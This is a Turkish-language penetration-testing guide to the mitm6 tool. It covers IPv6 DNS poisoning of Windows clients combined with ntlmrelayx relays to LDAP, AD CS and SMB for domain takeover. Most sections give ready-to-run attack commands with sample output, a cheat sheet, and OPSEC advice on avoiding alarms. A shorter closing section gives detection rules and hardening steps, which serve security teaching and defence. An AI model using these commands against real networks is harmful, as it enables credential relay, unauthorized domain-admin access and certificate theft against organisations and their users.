# mitm6

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows sistemlerinin varsayılan IPv6 önceliğini suistimal ederek sahte DHCPv6 ve DNS sunucusu açan, yerel ağdaki istemcilerin DNS trafiğini ele geçirip NTLM Relay saldırılarına yönlendiren MitM aracı.

---

## 1. Genel Bakış ve Amaç

**mitm6** (Dirk-jan Mollema / Fox-IT tarafından geliştirilen), kurumsal Active Directory ortamlarında modern Windows işletim sistemlerinin ağ mimarisindeki kritik bir tasarım zayıflığını istismar eder. Windows Vista'dan itibaren tüm Windows sürümleri varsayılan olarak **IPv6** protokolünü etkinleştirir ve RFC 3484/6724 gereğince isim çözümlemede IPv6 DNS sunucularını IPv4 DNS sunucularından **daha öncelikli** kabul eder.

Birçok kurumsal ağda altyapı yalnızca IPv4 üzerinden yönetilirken aktif bir IPv6 DHCP sunucusu veya yönlendirici (Router Advertisement - RA) yapılandırılmaz. Bu durum ağda sahipsiz bir IPv6 boşluğu yaratır. mitm6 bu boşluğu doldurarak yerel ağda yayın yapan (DHCPv6 Solicit) Windows makinelerine anında sahte DHCPv6 Advertise/Reply mesajları gönderir. İstemciye bir IPv6 adresi ve en önemlisi **kendi saldırgan makinesini birincil DNS sunucusu** olarak atar.

İstemci makine iç ağdaki bir servise veya internete erişmek istediğinde ya da Windows periyodik olarak `wpad` (Web Proxy Auto-Discovery) araması yaptığında, bu DNS isteği doğrudan saldırgana gider. mitm6 bu sorguları sahte olarak yanıtlayarak kurbanın kimlik doğrulama trafiğini eşzamanlı çalışan `ntlmrelayx` aracına aktarır.

```
    [ Kurban Windows İstemci ]
                |
    1. DHCPv6 Solicit (UDP 547): "Ağda IPv6 sunucusu var mı?"
                |
                v
    ================================================== Yerel Ağ
                |
                +--------------------------------> [ mitm6 (Saldırgan) ]
                                                           |
    2. DHCPv6 Reply: "DNS Sunucun benim: fe80::saldırgan" <--+
                |
    3. DNS Query: "wpad.lab.local veya DC01 nerede?"
                |
                v
         [ mitm6 DNS ] ===> Sahte IP Döndürür
                |
    4. HTTP / SMB Bağlantısı (NTLM Kimlik İsteği)
                |
                v
        [ ntlmrelayx ] ===> DC LDAP / AD CS / SMB'ye Relay Edildi!
                            (Yeni Domain Admin / Sertifika / Shell)
```

### Neden Önemli?
- **LLMNR/NBT-NS Kapalı Olsa Bile Çalışır:** Güvenlik ekipleri LLMNR ve NBT-NS'i GPO ile kapatsa dahi mitm6 tamamen meşru DNS protokolü üzerinden çalıştığı için etkilenmez.
- **Relay ile Zincirleme Başarı:** Tek başına hash toplamak yerine çoğunlukla `ntlmrelayx` ile birlikte kullanılır; Active Directory'de sıfır yetkili bir ağ konumundan doğrudan Domain Admin sertifikası veya yeni etki alanı bilgisayarı/yöneticisi üretilmesini sağlar.
- **Düşük Gürültü Seviyesi:** Klasik ARP Spoofing gibi tüm anahtarlayıcıyı (switch) kilitlemez; yalnızca istemcilerin IPv6 isteklerine yanıt döner.

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | mitm6 | Responder | ARP Spoofing (arpspoof) |
|---|---|---|---|
| **Kullandığı Katman** | IPv6 (DHCPv6 UDP 547, DNS UDP 53) | IPv4 (LLMNR UDP 5355, NBT-NS 137) | IPv4 (Layer 2 ARP Tablosu) |
| **Savunma Atlatma** | LLMNR/NBT-NS GPO engellerini aşar | GPO ile kolayca engellenebilir | Dinamik ARP Denetimi (DAI) engeller |
| **Rolü** | DNS trafiğini saldırgana çekmek | Rogue servislerle doğrudan hash avı | Tüm IP paketlerini yönlendirme |
| **Ana Hedef** | ntlmrelayx üzerinden LDAP/ADCS Relay | NetNTLMv2 hash yakalama ve kırma | Trafik dinleme / SSL Stripping |
| **Stabilite** | Yüksek (Filtrelendiğinde kararlıdır) | Yüksek | Düşük (Ağda çökme riski yüksektir) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

mitm6 kök (root/sudo) yetkileriyle ve birincil ağ arayüzü belirtilerek çalıştırılır:

```bash
sudo mitm6 -i <Ağ_Arayüzü> -d <Hedef_Etki_Alanı> [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-i, --interface` | Dinleme yapılacak ağ arayüzü (Zorunlu). | `-i eth0`, `-i ens33` |
| `-d, --domain` | Hedef Active Directory etki alanı adı. mitm6 yalnızca bu alan adına yapılan sorguları zehirler. | `-d lab.local` |
| `-w, --whitelisted` | Yalnızca bu listede tanımlı kurban host/IP'leri zehirlenir (OPSEC için kritik). | `-w 192.168.1.105` |
| `-b, --blacklisted` | Zehirlenmeyecek host veya IP adresleri (DC, Gateway veya Router). | `-b 192.168.1.1,192.168.1.10` |
| `-l, --localdomain` | İstemcilere DHCPv6 ile dağıtılacak sahte yerel arama alanı (DNS Search Domain). | `-l lab.local` |
| `-a, --no-auto-wpad` | Otomatik sahte WPAD DNS kaydı sunulmasını engeller. | `-a` |
| `--relay` | ntlmrelayx'in çalıştığı IP'yi belirtir (Varsayılan: saldırganın yerel adresi). | `--relay 192.168.1.50` |
| `-m, --mac` | Yalnızca belirli bir MAC adresine sahip kurbana DHCPv6 yanıtı dönülür. | `-m 00:0c:29:ab:cd:ef` |
| `--ignore-nofqdn` | FQDN belirtmeyen genel ve tekil host adı sorgularını görmezden gelir. | `--ignore-nofqdn` |
| `-v, --verbose` | Ayrıntılı terminal günlüğü üretir; her DHCPv6 ve DNS isteğini ekrana yazar. | `-v` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: mitm6 ve ntlmrelayx ile LDAP Relay (Etki Alanında Bilgisayar Hesabı Oluşturma)

En ölümcül kombinasyondur. Kurban Windows makinesinin kimlik doğrulaması Domain Controller'ın LDAP servisine relay edilerek yeni bir makine hesabı oluşturulur ve RBCD yetkisi tanımlanır.

```bash
# Terminal 1: ntlmrelayx'i LDAP hedefine karşı başlat
sudo impacket-ntlmrelayx -t ldap://192.168.1.10 --delegate-access -smb2support

# Terminal 2: mitm6'yı başlat
sudo mitm6 -i eth0 -d lab.local
```

```text
[*] Starting mitm6 on interface eth0
[*] Sent DHCPv6 advertise to fe80::20c:29ff:fe4a:1234
[*] Sent DHCPv6 reply to fe80::20c:29ff:fe4a:1234
[+] Poisoning DNS request from fe80::20c:29ff:fe4a:1234 for wpad.lab.local
```
```text
[ntlmrelayx Çıktısı]
[*] Authenticating against ldap://192.168.1.10 as LAB\ahmet.yilmaz SUCCEED
[*] Delegating access to attack computer via RBCD...
[+] Created computer: ATTACK385$ with password: Password123!
[+] Successfully configured Resource-Based Constrained Delegation!
```
*Analiz:* İstemcinin wpad sorgusu mitm6 üzerinden saldırgana yönlendirildi. `ntlmrelayx`, kurbanın kimlik bilgilerini DC'ye relay ederek saldırgan adına `ATTACK385$` makine hesabını ekledi.

---

### Senaryo 2: AD CS (Active Directory Sertifika Servisi) PKINIT Relay

Kurbanın NTLM isteği kurumsal Sertifika Otoritesine (CA Web Enrollment) iletilerek Domain Admin sertifikası ele geçirilir.

```bash
# Terminal 1: ntlmrelayx ile AD CS Web Enrollment hedefle
sudo impacket-ntlmrelayx -t http://ca.lab.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Terminal 2: mitm6 ile sadece hedef sunucuyu zehirle
sudo mitm6 -i eth0 -d lab.local -w 192.168.1.110
```

```text
[*] [ADCS] Relaying authentication for LAB\WS01$ to http://ca.lab.local/certsrv/certfnsh.asp
[+] [ADCS] Successfully generated Certificate for LAB\WS01$!
[*] Base64 Certificate written to /tmp/WS01.pfx
```
*Analiz:* İstemci makine hesabı (`WS01$`) relay edilerek AD CS üzerinden geçerli bir PFX sertifikası üretildi. Bu sertifika daha sonra `PKINITtools` veya `Certipy` ile Kerberos TGT biletine dönüştürülebilir.

---

### Senaryo 3: Hedefli ve Güvenli Zehirleme (Whitelist ve Blacklist)

Ağdaki ağ geçidini ve Domain Controller'ları korumak, sadece belirli bir hedef test makinesini zehirlemek için.

```bash
sudo mitm6 -i eth0 -d lab.local -w 192.168.1.120 -b 192.168.1.1,192.168.1.10 -v
```

```text
[*] Whitelist active: Only targeting 192.168.1.120
[*] Blacklist active: Ignoring gateway and DC queries
[*] Ignored DHCPv6 Solicit from DC01 (fe80::1)
[*] Sent DHCPv6 reply to 192.168.1.120 (Target accepted)
```
*Analiz:* DC ve Router zehirlenmekten korunarak ağ kesintisi engellendi; operasyon yalnızca kurban `192.168.1.120` üzerinde yoğunlaştırıldı.

---

### Senaryo 4: Otomatik WPAD Olmadan Sadece İç Kaynak Zehirleme

Bazı ortamlarda sahte WPAD tarayıcı uyarıları üretebilir. Bu durumda `-a` parametresiyle sahte proxy kapatılır ve sadece iç host DNS sorguları karşılanır.

```bash
sudo mitm6 -i eth0 -d lab.local -a
```

```text
[*] Automatic WPAD serving disabled (-a flag)
[*] Poisoning DNS request from fe80::aa:bb for fileserver.lab.local
```
*Analiz:* WPAD devreden çıkarıldığı için tarayıcı proxy döngüsü yaşanmaz; istemci iç paylaşım sunucusunu ararken zehirlenir.

---

### Senaryo 5: SMB Relay ile Kurban Sistemde Yerel Yönetici Açma

Kurbanın NTLM oturumu SMB imzalama zorunlu olmayan başka bir sunucuya relay edilir.

```bash
# Terminal 1: SMB Relay dinleyici
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Terminal 2: mitm6
sudo mitm6 -i eth0 -d lab.local
```

```text
[*] Authenticating against smb://192.168.1.200 as LAB\yönetici SUCCEED
[*] User is Admin on target! SOCKS connection available.
```
*Analiz:* İstemci kimliği `targets.txt` içindeki hedef sunucuya aktarıldı ve SOCKS tüneli üzerinden sistemde tam yetki sağlandı.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `[Errno 98] Address already in use (UDP 547)` | Linux sistemindeki `systemd-networkd`, `NetworkManager` veya yerel DHCPv6 istemcisi port 547'yi kullanıyor. | `sudo systemctl stop NetworkManager` veya `ss -tulpn \| grep 547` ile süreci tespit edip `kill` edin. |
| `Victim machines lose internet connectivity / DNS failure` | mitm6 sahte DNS yanıtı döndükten sonra kurbanın meşru IPv4 sorgularını iletemedi veya upstream DNS tanımlanmadı. | mitm6 çalıştırırken kurbanın meşru DNS sunucusuna erişebildiğinden emin olun; test bitince mitm6'yı durdurup istemcinin IP yenilemesini sağlayın (`ipconfig /renew6`). |
| `Attack failed: Server requires signing (LDAPS / SMB)` | Hedef Domain Controller'da LDAP Signing veya sunucuda SMB Signing zorunludur. | LDAP yerine imzalama zorunluluğu olmayan HTTP (AD CS) hedeflerine yönelin (`-t http://...`) veya LDAPS üzerinde Channel Binding zorunlu değilse `ldaps://` deneyin. |
| `No DHCPv6 Solicit messages seen on interface` | 1. Kurumsal anahtarlayıcıda (Cisco/Aruba) **DHCPv6 Snooping / Guard** aktiftir.<br>2. Kurban makinelerde IPv6 adaptörü kapatılmıştır. | Wireshark ile `dhcpv6` filtresi uygulayıp ağda paket olup olmadığını kontrol edin. Switch koruması varsa IPv4 tabanlı zorlamalı kimlik araçlarına (Coercer/PetitPotam) geçin. |
| `ntlmrelayx: Attack failed: Username is not admin` | Relay edilen kimlik hedef sunucuda veya LDAP üzerinde yetkisiz bir standart kullanıcıdır. | `--delegate-access` bayrağı ile standart kullanıcılar için varsayılan olan `MachineAccountQuota` (yeni makine ekleme hakkı) zafiyetini kullanın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Domain Controller Event ID 4624 (Logon):**
  - Logon Type `3` (Network Logon).
  - Kaynak IP: Saldırganın IPv4 veya IPv6 link-local adresi (`fe80::...`).
  - Kimlik: Kurban kullanıcının hesabı.
- **Domain Controller Event ID 4720 (User/Computer Account Created):**
  - `ntlmrelayx` başarılı olduğunda yeni bir makine hesabı oluşturulur (`ATTACK...$`).
- **Domain Controller Event ID 4728 / 4732 (Group Membership Change):**
  - Relay ile bir kullanıcı yetkili gruba eklenirse oluşur.
- **Sysmon Event ID 22 (DNS Query):**
  - İstemcilerin sürekli `wpad.domain.local` veya iç isimleri IPv6 DNS üzerinden sorgulaması.

### 5.2 Ağ ve EDR İmzaları
- **DHCPv6 Flood / Rogue Server:** Ağ izleme sistemleri (NDR / Zeek / Corelight), ağda birden bire ortaya çıkan bilinmeyen MAC adresli bir DHCPv6 sunucusunu ve ardı ardına gönderilen `DHCPv6 Advertise` paketlerini tespit eder.
- **DNS Yanıtlarında Link-Local Adresler:** Bir iç alan adına ait AAAA kayıtlarının harici veya yabancı bir `fe80::` adresine çözümlenmesi.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS and Rogue DHCPv6 | IPv6 DNS zehirleme ve kimlik relay operasyonu. |
| **T1187** | Forced Authentication | İstemcileri sahte wpad veya kaynaklara kimlik doğrulamaya yöneltme. |
| **T1556** | Modify Authentication Process | NTLM doğrulamasını LDAP veya ADCS üzerinde suiistimal etme. |
| **T1078** | Valid Accounts | Relay sonucu elde edilen yetkili hesapları kullanma. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **Ağ Kesintisi:** Tüm subnet'in DNS'ini devralmak internet kesintisine yol açar. | Asla parametresiz çalıştırmayın; `-w <Kurban_IP>` ile yalnızca tek bir hedef seçin. |
| **Süre Yönetimi:** Uzun süreli çalıştırma kesinlikle alarm üretir. | Başarılı bir relay sağlandığında (`ntlmrelayx` shell veya bilet verdiğinde) mitm6'yı derhal durdurun. |
| **Domain Filtresi:** Yanlış alan adları internet sorgularını kilitler. | Mutlaka `-d <hedef.local>` ile yalnızca şirket etki alanını hedefleyin. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (Sigma — Rogue DHCPv6 Tespiti)
```yaml
title: Rogue DHCPv6 Server Traffic Detected
status: experimental
description: Ağda yetkisiz bir hosttan gelen DHCPv6 Advertise veya Reply paketleri.
logsource:
    category: network_traffic
detection:
    dhcpv6_server:
        src_port: 547
        dst_port: 546
    filter_legit:
        src_ip|startswith: 'fe80::1' # Meşru Router IP'si
    condition: dhcpv6_server and not filter_legit
level: critical
```

#### Tespit Kuralı (KQL — Microsoft Sentinel / Defender for Endpoint)
```kql
// IPv6 DNS Sunucusu Değişikliği ve Anormal WPAD İstekleri
DeviceNetworkEvents
| where ActionType == "DnsQueryResponse"
| where AdditionalFields has "wpad" or RemoteIPType == "IPv6"
| where RemoteUrl endswith ".local"
| project Timestamp, DeviceName, InitiatingProcessAccountName, RemoteIP, RemoteUrl
| order by Timestamp desc
```

#### Sertleştirme ve Önleme Adımları
1. **IPv6 DHCP Guard & RA Guard:** Tüm kurumsal switch'lerde (Cisco/Aruba) erişim portlarında `ipv6 dhcp guard` ve `ipv6 nd raguard` aktif edilmelidir.
2. **Kullanılmayan IPv6'yı Kapatma:** Ağda IPv6 altyapısı bulunmuyorsa GPO üzerinden devre dışı bırakılabilir veya istemcilerin DHCPv6 üzerinden DNS öğrenmesi engellenmelidir:
   - GPO: `Computer Configuration -> Policies -> Administrative Templates -> Network -> TCPIP Parameters -> DisabledComponents = 0x20` (IPv4 öncelikli) veya `0xFF`.
3. **LDAP Channel Binding ve Signing:** Domain Controller'larda LDAP imzalama zorunlu hale getirilmelidir (`LDAPServerIntegrity = 2`).
4. **AD CS Web Enrollment Güvenliği:** Sertifika servislerinde HTTP Endpoint'ler kaldırılmalı veya HTTPS ile EPA (Extended Protection for Authentication) açılmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Standart mitm6 başlatma (Etki alanı odaklı)
sudo mitm6 -i eth0 -d sirket.local
```
- **Ne Yapar?:** `eth0` üzerinde dinleme yaparak `sirket.local` için sahte IPv6 DNS sunucusu açar.
- **Ne Zaman Kullanılır?:** Kurumsal ağda genel kimlik relay saldırısı başlatılırken.
- **Parametreler:** `-i eth0`: Ağ arayüzü; `-d sirket.local`: Hedef etki alanı.

```bash
# 2. ntlmrelayx ile LDAP Relay entegrasyonu (Terminal 1 & 2)
sudo impacket-ntlmrelayx -t ldap://dc01.sirket.local --delegate-access -smb2support
sudo mitm6 -i eth0 -d sirket.local
```
- **Ne Yapar?:** mitm6 trafiği çeker, ntlmrelayx DC üzerinde RBCD yetkisi tanımlar.
- **Ne Zaman Kullanılır?:** Sıfır yetkiden etki alanı kontrolü elde etmek istendiğinde.
- **Parametreler:** `--delegate-access`: RBCD konfigürasyonu; `-smb2support`: SMBv2 desteği.

```bash
# 3. Yalnızca tek bir kurban makineyi hedefleme (Whitelist - OPSEC)
sudo mitm6 -i eth0 -d sirket.local -w 192.168.1.105
```
- **Ne Yapar?:** Yalnızca `192.168.1.105` IP'li istemciye yanıt verir; diğer sistemleri etkilemez.
- **Ne Zaman Kullanılır?:** Belirli bir yöneticinin veya test makinesinin trafiği izole hedeflendiğinde.
- **Parametreler:** `-w 192.168.1.105`: Whitelist hedef IP.

```bash
# 4. Kritik sunucuları ve ağ geçidini hariç tutma (Blacklist)
sudo mitm6 -i eth0 -d sirket.local -b 192.168.1.1,192.168.1.10,192.168.1.11
```
- **Ne Yapar?:** Gateway ve Domain Controller'lardan gelen sorguları yok sayar.
- **Ne Zaman Kullanılır?:** Ağda kritik sunucuların bağlantısının kopmasını engellemek için.
- **Parametreler:** `-b`: Virgülle ayrılmış hariç tutulacak IP listesi.

```bash
# 5. Sahte WPAD sunulmasını devre dışı bırakma (-a)
sudo mitm6 -i eth0 -d sirket.local -a
```
- **Ne Yapar?:** WPAD sorgularına sahte cevap dönmez, sadece iç host isimlerini zehirler.
- **Ne Zaman Kullanılır?:** Kurbanların tarayıcılarında proxy hataları oluşmasını önlemek için.
- **Parametreler:** `-a`: No auto WPAD.

```bash
# 6. AD CS Sertifika servisine Relay ile makine sertifikası alma
sudo impacket-ntlmrelayx -t http://ca.sirket.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```
- **Ne Yapar?:** mitm6'nın yakaladığı kimliği CA sunucusuna relay ederek bilgisayar sertifikası çeker.
- **Ne Zaman Kullanılır?:** PKINIT üzerinden Kerberos TGT elde edip etki alanında kalıcılık sağlamak için.
- **Parametreler:** `--adcs`: Sertifika relay modu; `--template Machine`: Bilgisayar şablonu.

```bash
# 7. Belirli bir MAC adresine yönelik DHCPv6 yanıtlama
sudo mitm6 -i eth0 -d sirket.local -m 00:50:56:a1:b2:c3
```
- **Ne Yapar?:** Yalnızca donanım adresi eşleşen ağ kartına DHCPv6 paketi atar.
- **Ne Zaman Kullanılır?:** IP adresi dinamik olan hedef bir dizüstü bilgisayarı avlarken.
- **Parametreler:** `-m`: Hedef fiziksel MAC adresi.

```bash
# 8. SOCKS proxy modu ile SMB hedeflerine sızma
sudo impacket-ntlmrelayx -tf smb_targets.txt -smb2support -socks
```
- **Ne Yapar?:** mitm6 tarafından yönlendirilen kurbanların kimliklerini SOCKS arkasında saklar.
- **Ne Zaman Kullanılır?:** `proxychains` ile kurban adına komut veya dosya erişimi sağlamak için.
- **Parametreler:** `-socks`: SOCKS proxy sunucusunu başlat; `-tf`: Hedef IP dosyası.

```bash
# 9. FQDN olmayan tekil sorguları yok sayarak gürültüyü azaltma
sudo mitm6 -i eth0 -d sirket.local --ignore-nofqdn
```
- **Ne Yapar?:** `ping server` gibi tam etki alanı içermeyen yerel sorguları zehirlemez; yalnızca `server.sirket.local` biçimindekileri yanıtlar.
- **Ne Zaman Kullanılır?:** Yerel NetBIOS/WINS uyumlu sistemlerin çalışmasını bozmamak için.
- **Parametreler:** `--ignore-nofqdn`: FQDN olmayan sorguları yoksay.

```bash
# 10. ntlmrelayx için özel IPv4 saldırgan IP'si belirtme
sudo mitm6 -i eth0 -d sirket.local --relay 192.168.1.75
```
- **Ne Yapar?:** DNS yanıtlarında kurbanlara relay sunucusu olarak belirtilen statik IP adresini döndürür.
- **Ne Zaman Kullanılır?:** mitm6 ile ntlmrelayx farklı fiziksel/sanal makinelerde veya IP'lerde çalıştırıldığında.
- **Parametreler:** `--relay 192.168.1.75`: Relay hedef IP'si.

---

## Kaynaklar

- **Resmi GitHub Deposu (mitm6):** [https://github.com/dirkjanm/mitm6](https://github.com/dirkjanm/mitm6)
- **Fox-IT Blog — The worst of both worlds: Combining IPv6 and IPv4 for MitM:** [https://blog.fox-it.com/](https://blog.fox-it.com/)
- **Dirk-jan Mollema — Relaying Kerberos and NTLM over IPv6:** [https://dirkjanm.io/](https://dirkjanm.io/)

---

> **Önceki:** [← Inveigh](./Inveigh.md) · **Sonraki:** [Farmer →](./Farmer.md)

